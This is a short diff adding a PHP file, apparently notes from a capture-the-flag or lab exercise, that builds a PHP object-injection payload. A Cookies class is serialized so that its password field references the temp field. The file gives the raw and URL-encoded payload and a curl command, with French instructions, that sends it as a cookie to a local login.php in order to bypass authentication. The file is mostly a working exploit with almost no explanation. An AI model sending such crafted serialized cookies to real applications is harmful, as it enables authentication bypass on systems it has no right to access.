@@ -1,0 +1,32 @@
+
+
+
+class Cookies {
+    var $username;
+    var $temp;
+    var $password;
+        
+}
+
+
+
+//$a = new Cookies;
+//$a->password = &$a->temp;
+
+
+//O:7:"Cookies":3:{s:8:"username";N;s:4:"temp";N;s:8:"password";R:3;}
+
+//O%3A7%3A%22Cookies%22%3A3%3A%7Bs%3A8%3A%22username%22%3BN%3Bs%3A4%3A%22temp%22%3BN%3Bs%3A8%3A%22password%22%3BR%3A3%3B%7D
+
+
+
+//$a = new Cookies;
+//$a->password = &$a->temp;
+
+
+envoyer la cookie avec curl ou burp suit:
+
+curl :
+curl --cookie 'cook=O%3A7%3A%22Cookies%22%3A3%3A%7Bs%3A8%3A%22username%22%3BN%3Bs%3A4%3A%22temp%22%3BN%3Bs%3A8%3A%22password%22%3BR%3A3%3B%7D' 'http://127.0.0.1/login.php'
+
+
